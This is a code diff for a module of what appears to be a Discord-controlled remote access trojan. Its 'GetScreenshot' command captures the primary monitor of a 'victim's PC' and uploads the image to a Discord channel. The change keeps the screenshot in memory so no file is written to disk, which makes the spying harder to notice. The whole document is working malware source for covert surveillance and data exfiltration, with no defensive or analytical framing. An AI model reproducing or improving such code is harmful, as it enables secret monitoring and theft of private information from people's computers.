@@ -1,6 +1,7 @@
 import disnake as discord
 from disnake.ext import commands
 from datetime import datetime
+from io import BytesIO
 
 import os, requests, mss, time
 nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
@@ -19,14 +20,25 @@ class GetScreenshot(commands.Cog):
         """
         if str(victim) == str(self.bot.identifier):
             await ctx.response.defer()
-            
+           
             with mss.mss() as sct: 
-                sct.shot( output=nr_working+"\\monitor.png" )
+                img = sct.grab(  sct.monitors[1]  )
+                
+                png = mss.tools.to_png( 
+                    img.rgb, 
+                    img.size 
+                )
+
             await ctx.followup.send(
-                embed=self.bot.genEmbed( "Screenshot of victim's PC:", datetime.now() ).set_image( file = discord.File(nr_working + "\\monitor.png", filename='Screenshot.png') )
+                embed=self.bot.genEmbed( 
+                    "Screenshot of victim's PC:", 
+                    datetime.now() 
+                ),
+                file = discord.File(
+                    BytesIO(png),
+                    filename='Screenshot.png'
+                )
             )
-            time.sleep(2)
-            os.remove(nr_working + "\\monitor.png")
 
 def setup(bot: commands.Bot):
     bot.add_cog(GetScreenshot(bot))
